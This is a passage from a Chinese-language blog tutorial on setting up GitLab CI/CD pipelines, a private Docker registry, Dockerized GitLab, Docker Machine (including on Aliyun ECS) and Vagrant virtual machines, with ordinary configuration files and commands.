<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .gitlab-ci.yml</span></span><br><span class="line"><span class="comment"># 定义阶段</span></span><br><span class="line"><span class="attr">stages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">build</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">test</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">deploy</span></span><br><span class="line"><span class="comment"># 定义任务 1</span></span><br><span class="line"><span class="attr">job1:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">test</span></span><br><span class="line">  <span class="comment"># 指定runner</span></span><br><span class="line">  <span class="attr">tags:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">demo</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;First&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Second&quot;</span></span><br><span class="line"><span class="comment"># 定义任务 2</span></span><br><span class="line"><span class="attr">job2:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">tags:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">demo</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Build First&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Build Second&quot;</span></span><br><span class="line"><span class="attr">job3:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">tags:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">demo</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">echo</span> <span class="string">&quot;Deploy&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="检查代码风格"><a href="#检查代码风格" class="headerlink" title="检查代码风格"></a>检查代码风格</h4><p>首先注册一个Docker类型的Runner：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo gitlab-ci-multi-runner register</span><br><span class="line"><span class="comment"># 1. 输入 gitlab_ci 的URL</span></span><br><span class="line"><span class="comment"># 2. 输入gitlab-ci的token</span></span><br><span class="line"><span class="comment"># 2.1 进入gitlab中随便打开一个Repository-&gt;Setting-&gt;CI/CD</span></span><br><span class="line"><span class="comment"># 2.2 进入Runners settings-&gt;Setup a specific Runner manually，复制Token</span></span><br><span class="line"><span class="comment"># 3. 输入描述，保存默认即可</span></span><br><span class="line"><span class="comment"># 4. 输入Runner Tags，这里是python3.7</span></span><br><span class="line"><span class="comment"># 5. 是否Run Untagged builds，false</span></span><br><span class="line"><span class="comment"># 6. 是否Lock Runner to current project，false</span></span><br><span class="line"><span class="comment"># 7. 选择执行器，docker</span></span><br><span class="line"><span class="comment"># 8. 选择Docker Image，python:3.7</span></span><br></pre></td></tr></table></figure>

<p>提前把Image拉取到本地：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull python:3.7</span><br></pre></td></tr></table></figure>

<p>在项目中加入：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .gitlab-ci.yml</span></span><br><span class="line"><span class="attr">stages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">stype</span></span><br><span class="line"><span class="attr">job1:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">stype</span></span><br><span class="line">  <span class="attr">tags:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">python3.7</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">tax</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tax</span> <span class="string">-e</span> <span class="string">pep8</span></span><br></pre></td></tr></table></figure>
<h4 id="自动化部署"><a href="#自动化部署" class="headerlink" title="自动化部署"></a>自动化部署</h4><p>CD是持续化部署，即在原来的基础上再进行项目部署。例如有一个项目，经过代码检查后做部署：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .gitlab-ci.yml</span></span><br><span class="line"><span class="attr">stages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">stype</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">deploy</span></span><br><span class="line"><span class="attr">job1:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">stype</span></span><br><span class="line">  <span class="attr">tags:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">python3.7</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">tax</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tax</span> <span class="string">-e</span> <span class="string">pep8</span></span><br><span class="line"><span class="attr">deploy-job:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">build</span> <span class="string">-t</span> <span class="string">program</span> <span class="string">.</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">if</span> [<span class="string">$(docker</span> <span class="string">ps</span> <span class="string">-ap</span> <span class="string">--filter</span> <span class="string">name=web)</span>]<span class="string">;</span> <span class="string">then</span> <span class="string">docker</span> <span class="string">rm</span> <span class="string">-f</span> <span class="string">web;fi</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">run</span> <span class="string">-d</span> <span class="string">--name</span> <span class="string">web</span> <span class="string">-p</span> <span class="number">8030</span><span class="string">:5000</span> <span class="string">program</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">demo</span> <span class="comment"># 这个demo是那个runner</span></span><br><span class="line">  <span class="comment"># 只有master分支变化才执行该job</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>如果风格检查不能通过的话，部署是无法进行的。</p>
<p>另外，为了不让用户每一次push代码都触发一次CI&#x2F;CD，我们可以把master分支锁定住，防止任何人提交。任何人必须在分支中改动。</p>
<p>在Gitlab中配置：<br>Repository-&gt;Protected Branches-&gt;master分支-&gt;Allowed to push 改为No one。</p>
<p>General-&gt;Merge request settings-&gt;Only allow merge requests to be merged if the pipeline succeeds.</p>
<p>用户在提交代码后，进入Gitlab平台，填写Merge Request，等待Pipeline通过。</p>
<p>管理员用户在收到Merge Requst后，则可以执行Merge操作，部署将自动执行。</p>
<h3 id="版本发布"><a href="#版本发布" class="headerlink" title="版本发布"></a>版本发布</h3><p>首先搭建一个Docker Registry，类似于Docker Hub。</p>
<p>这里创建第三个服务器，作为Docker Host。首先安装Docker，然后执行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d -v /opt/registry:/var/lib/registry -p 5000:5000 --restart=always --name registry registry:2</span><br></pre></td></tr></table></figure>

<p>回到Gitlab-CI服务器上，编辑<code>/etc/docker/daemon.json</code>文件：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;insecure-registries&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;Docker_Registry_IP:5000&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>重启Gitlab-CI服务器上的Docker服务：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>再从Docker Hub拉取一个镜像：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取busybox</span></span><br><span class="line">docker pull busybox</span><br><span class="line"><span class="comment"># 为其打上标签</span></span><br><span class="line">docker tag busybox Docker_Registry_IP:5000/busybox</span><br></pre></td></tr></table></figure>

<p>再Push到我们的私有仓库：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker push Docker_Registry_IP:5000/busybox</span><br></pre></td></tr></table></figure>

<p>如果这些步骤成功，则说明配置成功了。</p>
<p>下面修改文件<code>.gitlab-ci.yml</code>，增加一个Release操作：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># .gitlab-ci.yml</span></span><br><span class="line"><span class="attr">stages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">stype</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">deploy</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">release</span></span><br><span class="line"><span class="attr">job1:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">stype</span></span><br><span class="line">  <span class="attr">tags:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">python3.7</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">tax</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tax</span> <span class="string">-e</span> <span class="string">pep8</span></span><br><span class="line">  <span class="comment"># 当代码库新增一个Tag，该任务不执行</span></span><br><span class="line">  <span class="attr">except:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">deploy-job:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">deploy</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">build</span> <span class="string">-t</span> <span class="string">program</span> <span class="string">.</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">if</span> [<span class="string">$(docker</span> <span class="string">ps</span> <span class="string">-ap</span> <span class="string">--filter</span> <span class="string">name=web)</span>]<span class="string">;</span> <span class="string">then</span> <span class="string">docker</span> <span class="string">rm</span> <span class="string">-f</span> <span class="string">web;fi</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">run</span> <span class="string">-d</span> <span class="string">--name</span> <span class="string">web</span> <span class="string">-p</span> <span class="number">8030</span><span class="string">:5000</span> <span class="string">program</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">demo</span> </span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加Release操作</span></span><br><span class="line"><span class="attr">release-job:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">release</span></span><br><span class="line">  <span class="attr">script:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">build</span> <span class="string">-t</span> <span class="string">Docker_Registry_IP:5000/demo:$CI_COMMIT_TAG</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">docker</span> <span class="string">push</span> <span class="string">Docker_Registry_IP:5000/demo:$CI_COMMIT_TAG</span></span><br><span class="line">  <span class="attr">tags:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">demo</span></span><br><span class="line">  <span class="comment"># 只有代码库新增一个Tag，就会触发一次Release</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tags</span></span><br></pre></td></tr></table></figure>

<p><code>$CI_COMMIT_TAG</code>是Gitlab定义的环境变量，是版本的标签，可以通过Git工具提交代码时添加新的Tag。</p>
<h2 id="其他Docker尝试"><a href="#其他Docker尝试" class="headerlink" title="其他Docker尝试"></a>其他Docker尝试</h2><h3 id="Docker-GPU"><a href="#Docker-GPU" class="headerlink" title="Docker GPU"></a>Docker GPU</h3><p>(Docker GPU)[<a href="https://blog.opskumu.com/docker-gpu.html]">https://blog.opskumu.com/docker-gpu.html]</a></p>
<h3 id="Docker-Gitlab"><a href="#Docker-Gitlab" class="headerlink" title="Docker Gitlab"></a>Docker Gitlab</h3><p>(Docker Gitlab)[<a href="https://www.jianshu.com/p/080a962c35b6]">https://www.jianshu.com/p/080a962c35b6]</a></p>
<p>安装Gitlab：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">docker pull gitlab/gitlab-ce</span><br><span class="line"><span class="comment"># 运行容器</span></span><br><span class="line">docker run -d -p 8443:443 -p 8030:80 -p 32222:22 --name gitlab --restart always -v ~/gitlab/config:/etc/gitlab -v ~/gitlab/logs:/var/log/gitlab -v ~/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce </span><br></pre></td></tr></table></figure>

<p>配置Gitlab文件<code>./gitlab/config/gitlab.rb</code>：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置http协议所使用的访问地址</span></span><br><span class="line">external_url <span class="string">&#x27;http://192.168.199.231:8030&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置ssh协议所使用的访问地址和端口</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;gitlab_ssh_host&#x27;</span>] = <span class="string">&#x27;192.168.199.231&#x27;</span></span><br><span class="line">gitlab_rails[<span class="string">&#x27;gitlab_shell_ssh_port&#x27;</span>] = 32222 <span class="comment"># 此端口是run时22端口映射的32222端口</span></span><br></pre></td></tr></table></figure>

<p>配置完成后，重启Gitlab：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker restart gitlab</span><br></pre></td></tr></table></figure>

<h3 id="Docker-DNS"><a href="#Docker-DNS" class="headerlink" title="Docker DNS"></a>Docker DNS</h3><p>拉取镜像</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker pull dns-server</span><br></pre></td></tr></table></figure>

<p>其他机器启动时可以使用参数<code>--dns</code>指定DNS容器。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run --dns=xx.xx.xx.xx images</span><br></pre></td></tr></table></figure>



















<h2 id="Docker-Machine"><a href="#Docker-Machine" class="headerlink" title="Docker Machine"></a>Docker Machine</h2><p>在安装Docker Toolbox时，也自动安装了docker machine。利用docker machine可以创建虚拟机（借助VirtualBox），这个虚拟机小巧且精简，附带Docker，但是功能有限。用户如果想要更全功能的Linux虚拟机，可以使用后面的Vagrant。</p>
<h3 id="创建虚拟机"><a href="#创建虚拟机" class="headerlink" title="创建虚拟机"></a>创建虚拟机</h3><p>创建虚拟机：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-machine create name</span><br></pre></td></tr></table></figure>

<p>常用命令</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-machine <span class="built_in">ls</span>        <span class="comment"># 列出所有虚拟机</span></span><br><span class="line">docker-machine ssh name  <span class="comment"># 登录虚拟机</span></span><br><span class="line">docker-machine stop name <span class="comment"># 停止虚拟机</span></span><br><span class="line">docker-machine <span class="built_in">env</span> name  <span class="comment"># 查看环境变量</span></span><br></pre></td></tr></table></figure>

<h3 id="切换Docker服务端"><a href="#切换Docker服务端" class="headerlink" title="切换Docker服务端"></a>切换Docker服务端</h3><p>默认情况下，我们在开机后初次运行Docker Quickstart Terminal时，它就会为我们启动一个虚拟机，这个虚拟机包含了一个Docker Server，所以 <strong>这里不必切换Docker服务端</strong> 。</p>
<p>利用Docker Machine可以实现切换Docker Server。如果不想把自己本地的计算机搞乱，我们可以直接安装Docker Client，而服务端通过其他方式创建，也可以正常使用。</p>
<h4 id="切换本地Docker服务端"><a href="#切换本地Docker服务端" class="headerlink" title="切换本地Docker服务端"></a>切换本地Docker服务端</h4><p>首先利用上面的docker-machine命令创建带docker server的虚拟机，然后执行下面的操作。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用命令查看虚拟机的环境变量</span></span><br><span class="line">docker-machine <span class="built_in">env</span> name</span><br><span class="line"><span class="comment"># 之后会得到虚拟机的环境变量以及一条命令</span></span><br><span class="line"><span class="comment"># eval $(docker-machine env name)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行这条语句，我们就切换了Docker服务端</span></span><br><span class="line"><span class="built_in">eval</span> $(docker-machine <span class="built_in">env</span> name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行这条语句取消切换</span></span><br><span class="line">docker-machine <span class="built_in">env</span> --<span class="built_in">unset</span></span><br><span class="line"><span class="comment"># 之后会得到一条命令，我们执行它</span></span><br><span class="line"><span class="comment"># eval $(docker-machine env --unset)</span></span><br><span class="line"><span class="built_in">eval</span> $(docker-machine <span class="built_in">env</span> --<span class="built_in">unset</span>)</span><br></pre></td></tr></table></figure>

<h4 id="切换阿里云Docker服务端"><a href="#切换阿里云Docker服务端" class="headerlink" title="切换阿里云Docker服务端"></a>切换阿里云Docker服务端</h4><p>使用阿里云的ECS，首先得保证账号内有钱。其他云平台道理相同。</p>
<p><a href="https://docs.docker.com/machine/get-started-cloud/">官方参考页面</a></p>
<p>进入官方参考页面，点击第三方驱动插件（3rd-party driver plugins），就可以找到<a href="https://github.com/AliyunContainerService/docker-machine-driver-aliyunecs">Aliyun ECS（点击进入）</a>。</p>
<p>首先是<a href="https://docker-machine-aliyunecs-drivers.oss-cn-beijing.aliyuncs.com/docker-machine-driver-aliyunecs_windows-amd64.tgz">下载驱动</a>，解压文件，修改得到的文件的后缀为<code>.exe</code>，并将驱动的所在目录添加到环境变量。</p>
<p>打开阿里云平台，管理控制台，访问控制，用户管理，创建AccessKey和Secret。 <strong>注意</strong> ：Secret只显示一次，一定要保存好。</p>
<p>回到本地命令行，执行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-machine create -d aliyunecs --aliyunecs-io-optimized=optimized --aliyunecs-instance-type=ecs.c5.large --aliyunecs-access-key-id=用户ID --aliyunecs-access-key-secret=用户Secret --aliyunecs-region=cn-qingdao 虚拟机name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这些参数的值可以在阿里云平台上的创建页面查看。</span></span><br></pre></td></tr></table></figure>

<p>创建好以后，就可以按照上一节的内容切换服务端了。</p>
<h2 id="Vagrant（可选）"><a href="#Vagrant（可选）" class="headerlink" title="Vagrant（可选）"></a>Vagrant（可选）</h2><p>Vagrant是一个虚拟机管理工具。可以用脚本的方式快速创建虚拟机（需要安装VirtualBox）以及虚拟机集群。如果不想直接在自己的电脑上安装Docker，可以尝试Vagrant。</p>
<p><a href="https://www.vagrantup.com/">Vagrant官网</a><br><a href="https://www.vagrantup.com/downloads.html">Vagrant下载页</a><br><a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox官网</a></p>
<h3 id="Vagrant-镜像"><a href="#Vagrant-镜像" class="headerlink" title="Vagrant 镜像"></a>Vagrant 镜像</h3><h4 id="官方镜像"><a href="#官方镜像" class="headerlink" title="官方镜像"></a>官方镜像</h4><p>首先进入<code>Vagrant官网</code>，点击<code>Find Boxes</code>，输入要查找的虚拟机。例如输入<code>Unbutu 16.04</code>，搜索后进入，选择New，会出现如下页面：</p>
<img src="/2020/02/04/%E8%BF%90%E7%BB%B4/Docker/vagrant_search.jpg" class="" title="Vagrant 搜索结果">

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建Vagrantfile</span></span><br><span class="line">vagrant init ubuntu/xenial64</span><br><span class="line"><span class="comment"># 执行Vagrantfile</span></span><br><span class="line">vagrant up</span><br></pre></td></tr></table></figure>

<p>执行页面中提示的操作，Vagrant会在当前目录创建该虚拟机。</p>
<h4 id="非官方镜像"><a href="#非官方镜像" class="headerlink" title="非官方镜像"></a>非官方镜像</h4><p>如果上面的过程太漫长，可以自定义添加Box。打开<a href="http://www.vagrantbox.es/">vagrantbox.es</a>，按照上面的提升操作添加虚拟机镜像。</p>
<p>例如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vagrant box add ubuntu_new https://atlas.hashicorp.com/envimation/boxes/ubuntu-xenial-docker</span><br><span class="line">vagrant init ubuntu_new</span><br><span class="line">vagrant up</span><br></pre></td></tr></table></figure>

<p>如果命令行下载速度较慢，可以使用迅雷等工具下载到本地，再使用：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vagrant box add ubuntu_new /path/to/box</span><br><span class="line">vagrant init ubuntu_new</span><br><span class="line">vagrant up</span><br></pre></td></tr></table></figure>

<p>也可以到清华镜像下载，选择目录中64位<code>vagrant.box</code>文件即可。<br><a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-cloud-images/bionic/current/">清华镜像源</a></p>
<p>Ubuntu 各个版本编号</p>
<table>
<thead>
<tr>
<th>版本号</th>
<th>代号</th>
</tr>
</thead>
<tbody><tr>
<td>16.04</td>
<td>Xenial</td>
</tr>
<tr>
<td>18.04</td>
<td>Bionic</td>
</tr>
<tr>
<td>19.04</td>
<td>Disco</td>
</tr>
<tr>
<td>20.04</td>
<td>Focal</td>
</tr>
</tbody></table>
<h3 id="Vagrant-SSH"><a href="#Vagrant-SSH" class="headerlink" title="Vagrant SSH"></a>Vagrant SSH</h3><p>在虚拟机目录下执行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vagrant ssh</span><br></pre></td></tr></table></figure>

<p>即可进入虚拟机。</p>
<h3 id="Vagrant-常用命令"><a href="#Vagrant-常用命令" class="headerlink" title="Vagrant 常用命令"></a>Vagrant 常用命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vagrant box add   <span class="comment"># 添加一个box</span></span><br><span class="line">vagrant box list  <span class="comment"># 列出所有的box</span></span><br><span class="line">vagrant box remove  <span class="comment"># 删除box</span></span><br><span class="line">vagrant init ubuntu/trustry64  <span class="comment"># 初始化一个新的虚拟机</span></span><br><span class="line"></span><br><span class="line">vagrant up        <span class="comment"># 启动虚拟机</span></span><br><span class="line">vagrant ssh       <span class="comment"># 登录虚拟机</span></span><br><span class="line">vagrant halt      <span class="comment"># 关闭虚拟机</span></span><br><span class="line">vagrant reload    <span class="comment"># 重启虚拟机</span></span><br><span class="line">vagrant <span class="built_in">suspend</span>   <span class="comment"># 挂起虚拟机</span></span><br><span class="line">vagrant resume    <span class="comment"># 恢复挂起</span></span><br><span class="line">vagrant destory [name|<span class="built_in">id</span>]      <span class="comment"># 销毁虚拟机</span></span><br><span class="line"></span><br><span class="line">vagrant package   <span class="comment"># 打包当前虚拟机到box</span></span><br><span class="line">vagrant global-status  <span class="comment"># 查看当前所有虚拟机状态</span></span><br><span class="line">vagrant ssh-config  <span class="comment"># 查看ssh连接信息</span></span><br></pre></td></tr></table></figure>

<h3 id="Vagrant-配置文件"><a href="#Vagrant-配置文件" class="headerlink" title="Vagrant 配置文件"></a>Vagrant 配置文件</h3><p>通过编辑脚本也可以利用vagrant同时创建多台虚拟机。</p>
<p>我们在使用之前的方法创建虚拟机时，目录下会自动生成<code>Vagrantfile</code>文件，这就是Vagrant虚拟机的配置文件，里面包含虚拟机的配置，SSH的配置以及Vagrant的基础配置，这些配置是基于Ruby语法的。</p>
<p>单机模式配置：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># box</span></span><br><span class="line">config.vm.box = <span class="string">&quot;CentOs7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hostname</span></span><br><span class="line">config.vm.hostname = <span class="string">&quot;for_work&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟机网络设置</span></span><br><span class="line"><span class="comment"># 虚拟机网络有两种连接方式：</span></span><br><span class="line"><span class="comment"># 主机模式（host-only），虚拟机只能和主机通信，其他人无法访问到虚拟机。</span></span><br><span class="line"><span class="comment"># 桥接模式（bridge），虚拟机成为同主机在同一局域网下的独立主机。</span></span><br><span class="line">config.vm.network <span class="string">&quot;private_network&quot;</span>, <span class="symbol">ip:</span> <span class="string">&quot;192.168.33.10&quot;</span></span><br><span class="line"><span class="comment">#config.vm.network &quot;public_network&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 同步目录设置</span></span><br><span class="line">config.vm.synced_folder  <span class="string">&quot;/Users/path/www&quot;</span>, <span class="string">&quot;/vagrant&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口转发设置</span></span><br><span class="line">config.vm.network <span class="symbol">:forwarded_port</span>, <span class="symbol">guest:</span> <span class="number">80</span>, <span class="symbol">host:</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置多行脚本</span></span><br><span class="line">config.vm.provision <span class="string">&quot;shell&quot;</span>, <span class="symbol">inline:</span> <span class="string">&lt;&lt;-SHELL</span></span><br><span class="line"><span class="string">  sudo apt-get update</span></span><br><span class="line"><span class="string">SHELL</span></span><br></pre></td></tr></table></figure>

<p>参考脚本配置：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 例 1：</span></span><br><span class="line"><span class="title class_">Vagrant</span>.configure(<span class="string">&quot;2&quot;</span>) <span class="keyword">do</span> |<span class="params">config</span>|</span><br><span class="line">  config.vm.define <span class="symbol">:web</span> <span class="keyword">do</span> |<span class="params">web</span>|</span><br><span class="line">    web.vm.provider <span class="string">&quot;virtualbox&quot;</span> <span class="keyword">do</span> |<span class="params">v</span>|</span><br><span class="line">          v.customize [<span class="string">&quot;modifyvm&quot;</span>, <span class="symbol">:id</span>, <span class="string">&quot;--name&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;--memory&quot;</span>, <span class="string">&quot;512&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    web.vm.box = <span class="string">&quot;base_box&quot;</span></span><br><span class="line">    web.vm.hostname = <span class="string">&quot;web&quot;</span></span><br><span class="line">    web.vm.network <span class="symbol">:private_network</span>, <span class="symbol">ip:</span> <span class="string">&quot;192.168.33.10&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  config.vm.define <span class="symbol">:redis</span> <span class="keyword">do</span> |<span class="params">redis</span>|</span><br><span class="line">    redis.vm.provider <span class="string">&quot;virtualbox&quot;</span> <span class="keyword">do</span> |<span class="params">v</span>|</span><br><span class="line">          v.customize [<span class="string">&quot;modifyvm&quot;</span>, <span class="symbol">:id</span>, <span class="string">&quot;--name&quot;</span>, <span class="string">&quot;redis&quot;</span>, <span class="string">&quot;--memory&quot;</span>, <span class="string">&quot;512&quot;</span>]</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    redis.vm.box = <span class="string">&quot;base_box&quot;</span></span><br><span class="line">    redis.vm.hostname = <span class="string">&quot;redis&quot;</span></span><br><span class="line">    redis.vm.network <span class="symbol">:public_network</span>, <span class="symbol">ip:</span> <span class="string">&quot;192.168.33.11&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例 2：</span></span><br><span class="line"><span class="title class_">Vagrant</span>.require_version <span class="string">&quot;&gt;=1.6.0&quot;</span></span><br><span class="line"></span><br><span class="line">boxes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="symbol">:name</span> =&gt; <span class="string">&quot;node1&quot;</span>,</span><br><span class="line">    <span class="symbol">:eth1</span> =&gt; <span class="string">&quot;192.168.205.10&quot;</span>,</span><br><span class="line">    <span class="symbol">:mem</span> =&gt; <span class="string">&quot;1024&quot;</span>,</span><br><span class="line">    <span class="symbol">:cpu</span> =&gt; <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="symbol">:port</span> =&gt; <span class="string">&quot;8888&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="symbol">:name</span> =&gt; <span class="string">&quot;node2&quot;</span>,</span><br><span class="line">    <span class="symbol">:eth1</span> =&gt; <span class="string">&quot;192.168.205.11&quot;</span>,</span><br><span class="line">    <span class="symbol">:mem</span> =&gt; <span class="string">&quot;1024&quot;</span>,</span><br><span class="line">    <span class="symbol">:cpu</span> =&gt; <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="symbol">:port</span> =&gt; <span class="string">&quot;9999&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vagrant</span>.configure(<span class="number">2</span>) <span class="keyword">do</span> |<span class="params">config</span>|</span><br><span class="line">  config.vm.box = <span class="string">&quot;base_box&quot;</span></span><br><span class="line">  boxes.each <span class="keyword">do</span> |<span class="params">opts</span>|</span><br><span class="line">    config.vm.define opts[<span class="symbol">:name</span>] <span class="keyword">do</span> |<span class="params">config</span>|</span><br><span class="line">      config.vm.hostname = opts[<span class="symbol">:name</span>]</span><br><span class="line">      config.vm.provider <span class="string">&quot;vmware_fusion&quot;</span> <span class="keyword">do</span> |<span class="params">v</span>|</span><br><span class="line">        v.vmx[<span class="string">&quot;memsize&quot;</span>] = opts[<span class="symbol">:mem</span>]</span><br><span class="line">        v.vmx[<span class="string">&quot;numvcpus&quot;</span>] = opts[<span class="symbol">:cpu</span>]</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      config.vm.provider <span class="string">&quot;virtualbox&quot;</span> <span class="keyword">do</span> |<span class="params">v</span>|</span><br><span class="line">        v.customize [<span class="string">&quot;modifyvm&quot;</span>, <span class="symbol">:id</span>, <span class="string">&quot;--memory&quot;</span>, opts[<span class="symbol">:mem</span>]]</span><br><span class="line">        v.customize [<span class="string">&quot;modifyvm&quot;</span>, <span class="symbol">:id</span>, <span class="string">&quot;--cpus&quot;</span>, opts[<span class="symbol">:cpu</span>]]</span><br><span class="line">      <span 